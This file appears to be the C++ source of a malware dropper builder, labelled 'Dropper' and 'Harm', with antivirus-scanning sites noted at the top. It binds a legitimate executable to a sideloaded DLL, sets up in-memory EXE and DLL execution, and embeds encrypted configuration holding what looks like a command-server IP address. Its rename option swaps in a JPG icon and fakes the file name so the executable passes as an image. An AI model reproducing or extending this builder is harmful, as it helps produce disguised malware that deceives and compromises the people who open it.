
//http://www.virustotal.com
//http://www.virscan.org
//Dropper 
//Harm

#include <windows.h>
#include <stdio.h>
#include "Section.h"
#include "Resource.h"
#include "ForgeFilename.h"
#include "SetIcon.h"
#include <stdlib.h>
#include "Public.h"
#include <string.h>
#include "crypto.h"
#include "test.h"
#include "PEParser.h"
#include "Resource.h"
#include "crypto.h"
#include "FileHelper.h"
#include "main.h"

#define CONFIG_FILENAME					"config.dat"

#define TEMPLATE_TEMPORARY_FILENAME		"test.dat"

#define DEFAULT_TARGET_FILENAME			"out.exe"



#ifdef _CONSOLE

int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp) {

#ifdef _DEBUG
	test();
#endif

	int ret = 0;

	if (argc < 3)
	{
		printf("example:%s -b sogou.exe sbiedll.dll -f c:\\users -c params.dat -o out.exe\r\n",argv[0]);

		printf("example:%s -b sogou.exe sbiedll.dll -f c:\\users -p jy20200729 47.116.51.29 -o out.exe\r\n", argv[0]);

		printf("example:%s -re sogou.exe -c params.dat -o out.exe\r\n", argv[0]);

		printf("example:%s -rd sogou.dll -c params.dat -o out.dll\r\n", argv[0]);

		printf("%s param error\r\n",argv[0]);
		ret = getchar();
		return -1;
	}

	unsigned char key[16] = { 0 };
	Crypto::getkey(key);
	string curpath = Public::getCurPath();
	ret = SetCurrentDirectoryA(curpath.c_str());

	char filelist[MAX_FILE_COUNT][MAX_PATH];
	memset(filelist, 0, MAX_FILE_COUNT * MAX_PATH);
	int type = 0;
	int paramscnt = 0;
	char szoutFn[MAX_PATH] = { 0 };
	//string dstcryptfn = "test.dat";
	//string dstcfgfn = "config.dat";

	int bRename = FALSE;

	int cpu_arch = 0; 

	string outpath = "";

	for (int seq = 1; seq < argc; seq++)
	{
		char* str = argv[seq];
		if (lstrcmpiA(str, "-b") == 0 )
		{
			type = BIND_RELEASE_EXE;
			cpu_arch = GetPeArch(argv[seq +1]);

			for (int j = seq + 1; j < seq +3; j++)
			{
				lstrcpyA(filelist[paramscnt], argv[j]);
				paramscnt++;
			}

			seq += 2;
			continue;
		}
		else if (lstrcmpiA(str, "-re") == 0)
		{
			printf("argv[%i]:%s\r\n", seq, argv[seq + 1]);

			cpu_arch = GetPeArch(argv[seq + 1]);

			type = MEM_RUN_EXE;
			lstrcpyA(filelist[paramscnt], argv[seq + 1]);
			paramscnt++;
			seq += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-rd") == 0)
		{
			type = MEM_RUN_DLL;
			cpu_arch = GetPeArch(argv[seq + 1]);
			lstrcpyA(filelist[paramscnt], argv[seq + 1]);
			paramscnt++;
			seq += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-o") == 0)
		{
			lstrcpyA(szoutFn, argv[seq + 1]);
			seq += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-f") == 0)
		{
			outpath = argv[seq + 1];
			seq += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-c") == 0)
		{
			Public::prepareCfg(argv[seq + 1], CONFIG_FILENAME);
			lstrcpyA(filelist[paramscnt], CONFIG_FILENAME);
			paramscnt++;

			seq += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-p") == 0)
		{

			if (seq + 2 > argc) {
				printf("argument error\r\n");
				return -1;
			}
			Public::prepareParams(argv[seq + 1], argv[seq + 2],type, key,CONFIG_FILENAME);

			seq += 2;

			lstrcpyA(filelist[paramscnt], CONFIG_FILENAME);
			paramscnt++;		
			continue;
		}
		else if (lstrcmpiA(str, "-rename") == 0)
		{
			bRename = TRUE;
			continue;
		}
		
	}

	if (szoutFn[0] == 0)
	{
		lstrcpyA(szoutFn, DEFAULT_TARGET_FILENAME);
	}
	if (type == 0)
	{
		printf("command line something error!\r\n");
		ret = getchar();
		return -1;
	}

	printf("TYPE:%d,CPU:%d\r\n",type,cpu_arch);
	if(cpu_arch!= 32 && cpu_arch !=64)
	{
		printf("cannot get cpu architecture of target file\r\n");
		ret = getchar();
		return -1;
	}

	char secname[] = { '.','r','c','d','a','t','a',0 };

	string resultfn = Section::insertSection(type, cpu_arch, secname, filelist, paramscnt,outpath, szoutFn,key);
	if (resultfn == "")
	{
		printf("%s error\r\n",__FUNCTION__);
		ret = getchar();
		return -1;
	}

	if (bRename) {
		char jpgico[] = { 'j','p','g','.','i','c','o',0 };
		ChangeIcon(resultfn.c_str(), jpgico);
		char jpg[] = { 'j','p','e','g',0 };
		unsigned short ch[] = {'香','港','之','路',0};
		string mystr = (char*)ch;
		FakeFilename::fakefn(resultfn, jpg, mystr);
	}

	printf("bind type:%d cpu arch:%d completed\r\n", type, cpu_arch);
	ExitProcess(0);
	return 0;
}
#else
int __stdcall wWinMain(HINSTANCE inst, HINSTANCE prev, PWSTR cmdline, int showmode) {
	HANDLE h = GetModuleHandle(0);
	return 0;
}
#endif


int GetPeArch(char * fn) {
	int fs = 0;
	char* data = 0;
	int ret = 0;
	ret = FileHelper::fileReader(fn, &data, &fs);
	if (ret <= 0)
	{
		printf("fileReader file:%s error\r\n", fn);
		return -1;
	}
	int cpu_arch = PEParser::getPEArch((const char*)data);
	delete data;
	if(cpu_arch == 0x14c)
	{
		return 32;
	}
	else if(cpu_arch == 0x8664)
	{
		return 64;
	}
	else {

		return 0;
	}
	return 0;
}

//array[x][y]在内存中是随着内存地址递增的,array[x] array[x+1] 差是16，why?
//*[]结构是指针数组
//*是数组，也就是存放地址的变量

void test() {


	Resource::getResource((DWORD)GetModuleHandle(0), "");
	return;
}